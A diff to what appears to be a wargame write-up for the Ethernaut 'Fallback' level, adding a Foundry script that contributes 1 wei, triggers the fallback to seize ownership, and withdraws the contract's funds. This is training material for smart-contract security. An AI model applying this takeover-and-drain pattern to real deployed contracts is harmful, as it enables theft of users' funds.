@@ -185,7 +185,32 @@ cast call $CONTRACT "owner()(address)"
 cast send $CONTRACT "withdraw()" --private-key $PRIVATE_KEY
 ```
 
+### **Method 3 --- Foundry Script**
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
+import "../src/Fallback.sol";
+import "forge-std/Script.sol";
+import "forge-std/console.sol";
+
+contract FallbackSolution is Script {
+
+    Fallback public fallbackInstance = Fallback(payable(0xdeB300C6e013BbCa7891962c4e78A11d41161479));
+
+    function run() external {
+        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+
+        fallbackInstance.contribute{value: 1 wei}();
+        address(fallbackInstance).call{value: 1 wei}("");
+        console.log("New Owner: ", fallbackInstance.owner());
+        console.log("Attacker: ", vm.envAddress("Attacker_Address"));
+        fallbackInstance.withdraw();
+        
+        vm.stopBroadcast();
+    }
+}
+```
 
 **Why This Works**
 ------------------
